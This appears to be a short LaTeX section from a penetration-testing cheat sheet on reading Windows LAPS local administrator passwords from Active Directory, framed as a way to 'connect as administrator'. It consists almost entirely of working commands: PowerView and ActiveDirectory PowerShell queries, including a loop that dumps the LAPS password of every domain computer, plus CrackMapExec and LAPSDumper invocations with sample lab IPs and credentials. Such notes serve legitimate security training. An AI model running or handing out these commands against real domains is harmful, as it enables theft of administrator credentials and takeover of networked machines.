

\section{Read LAPS password}

allow to connect as administrator

\subsection{Windows}
\verb+Powerview+:
\begin{verbatim}
Import-Module .\PowerView.ps1
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name


Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}
\end{verbatim}

AD module:
\begin{verbatim}
Import-Module ActiveDirectory
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
\end{verbatim}

\subsection{Linux}

\begin{verbatim}
cme smb 10.129.18.161 -u yolanda -p toto  --laps LAPS07
\end{verbatim}


\href{https://github.com/n00py/LAPSDumper}{LAPSDumper}:
add domain to \verb+/etc/hosts+
\begin{verbatim}
python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
\end{verbatim}

